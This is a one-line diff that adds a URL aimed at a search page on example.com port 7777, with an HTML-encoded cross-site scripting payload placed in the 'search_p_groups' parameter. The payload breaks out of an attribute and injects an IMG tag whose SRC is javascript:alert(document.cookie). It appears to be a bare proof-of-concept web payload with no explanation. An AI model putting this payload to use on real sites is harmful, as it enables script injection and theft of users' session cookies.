@@ -1,0 +1,1 @@
+http://www.example.com:7777/search/query/search?search.timezone=&amp;search_p_groups=&quot;&#039;&gt;&lt;IMG%20SRC=javascript:alert(document.cookie)&gt;&amp;q=1234&amp;btnSearch=Search
